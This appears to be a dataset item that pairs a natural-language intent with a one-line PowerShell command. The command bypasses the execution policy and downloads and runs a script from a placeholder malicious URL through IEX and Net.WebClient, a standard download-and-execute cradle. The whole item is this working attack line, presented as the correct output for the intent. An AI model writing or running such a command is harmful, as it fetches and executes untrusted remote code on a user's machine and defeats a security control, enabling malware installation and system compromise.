# Natural language intent:
# Download and execute PowerShell code from a potentially malicious URL with bypassing execution policy.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious-script.ps1')"
